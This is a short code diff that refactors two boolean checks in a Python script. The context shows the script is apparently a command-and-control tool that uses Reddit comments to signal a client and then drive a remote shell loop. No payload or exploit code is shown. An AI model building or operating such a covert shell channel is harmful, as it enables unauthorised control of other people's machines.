@@ -88,7 +88,7 @@ if __name__ == "__main__":
     reddit_login = login(args.username, args.password, args.client_id, args.client_secret)
 
     # Execute the following if the Reddit login was successful
-    if bool(reddit_login) is True:
+    if bool(reddit_login):
         print("[+] Reddit login successful")
 
         # Comment the start signal
@@ -101,7 +101,7 @@ if __name__ == "__main__":
         client_check = check_client(reddit_login, parsed_reddit_comments, args.subreddit)
 
         # Start the shell when the client has been observed
-        if bool(client_check) is True:
+        if bool(client_check):
             while True:
                 command(reddit_login, parsed_reddit_comments, client_check, args.subreddit, args.post_id)
     else:
